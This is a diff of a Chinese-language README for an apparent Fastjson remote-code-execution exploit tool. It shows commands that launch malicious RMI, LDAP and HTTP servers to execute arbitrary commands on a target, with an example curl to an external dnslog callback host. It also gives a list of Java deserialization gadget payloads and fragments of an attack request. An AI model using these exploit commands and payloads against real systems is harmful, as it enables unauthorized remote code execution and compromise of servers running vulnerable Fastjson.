@@ -1,22 +1,24 @@
 # fastjson_rce_tool
 
 ```
-1. 启动RMI服务
+1. RMI (need tomcat8)
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
-:使用 EvilRMIServer 创建一个rmi服务, rmi的端口为1099，另一个socket通信的端口8888，后面写要执行的命令。
+创建一个rmi服务, rmi的端口为1099，另一个通信的端口8888，后面写要执行的命令。
 
-2. 启动LDAP/RMI服务和HTTP服务 (4和5的结合)
+
+
+2. RMI/LDAP/RMi + HTTP
 java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-或
+/
 java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-:创建一个LDAP/RMI服务和一个HTTP服务，1099为ldap/rmi服务的端口, 127.0.0.1为http服务IP地址，8888为http的端口，后面写要执行的命令。
-使用ldap服务的话，最推荐使用这个，前提是目标机器可以有最少2个端口出来。
+创建一个LDAP/RMI服务和一个HTTP服务，1099为ldap/rmi服务的端口, 
+127.0.0.1为http服务IP地址，8888为http的端口，后面写要执行的命令。
 
-3. 启动LDAP服务2
+
+
+3. 
 java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
-:使用 LDAPRefServer2 创建一个LDAP服务，1099为ldap服务的端口，后面写要用发序列化的payload，以及要执行的命令，
-使用ldap服务的话，目标机器只有1个端口可以出来，建议尝试使用这个。
-可以用的反序列payload如下：
+创建一个LDAP服务，1099为ldap服务的端口，后面写要用发序列化的payload，以及要执行的命令，
 CommonsBeanutils1  
 CommonsCollections1
 CommonsCollections2
@@ -32,15 +34,6 @@ Spring1
 Spring2            
 file   （BASE64编码后的反序列内容文件）
 
-
-
-4. 启动ldap服务1
-java -cp fastjson_tool.jar LDAPRefServer http://127.0.0.1:8888/#Object 1099
-:使用 LDAPRefServer 创建一个LDAP服务，http://127.0.0.1:8888/#Object为要访问加载恶意class的http服务，1099为LDAP服务的端口。
-
-5. 启动http服务器
-java -cp fastjson_tool.jar EvilHttpService 127.0.0.1 8888
-:使用 EvilHttpService ,创建一个http服务，127.0.0.1为机器的外网IP，8888为http服务的端口。
 
 ```
 
@@ -68,7 +61,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn" jdk8
+java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
